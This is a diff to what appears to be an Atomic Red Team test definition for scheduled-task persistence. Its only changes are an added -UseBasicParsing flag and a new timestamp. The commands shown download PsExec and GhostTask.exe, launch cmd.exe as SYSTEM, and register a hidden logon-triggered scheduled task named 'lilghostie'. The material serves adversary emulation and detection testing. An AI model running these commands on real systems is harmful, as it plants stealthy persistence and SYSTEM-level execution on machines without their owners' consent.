@@ -23,17 +23,18 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe")
           { exit 0} else { exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"; Expand-Archive
-          "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing;
+          Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
           -Force; Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"
           "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force; fi; if (Test-Path
           "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe") { exit 0} else
           { exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"; fi; "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"
-          \\localhost -accepteula -s "cmd.exe"; "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
-          \\localhost add lilghostie "cmd.exe" "/c notepad.exe" $env:USERDOMAIN +
-          ''\'' + $env:USERNAME logon'
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" -UseBasicParsing;
+          fi; "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula
+          -s "cmd.exe"; "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\localhost
+          add lilghostie "cmd.exe" "/c notepad.exe" $env:USERDOMAIN + ''\'' + $env:USERNAME
+          logon'
         cleanup: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target}
           -accepteula -s "cmd.exe"; "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
           \\#{target} delete #{task_name} > nul'
@@ -79,7 +80,7 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile
-        "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+        "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing
 
         Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
         -Force
@@ -102,9 +103,9 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" -UseBasicParsing
 
         '
     technique_created: '2019-11-27T14:58:00.429Z'
     atomic_guid: 704333ca-cc12-4bcf-9916-101844881f54
-    import_timestamp: '2026-10-20T07:08:27.628995Z'
+    import_timestamp: '2026-10-21T07:01:50.247048Z'
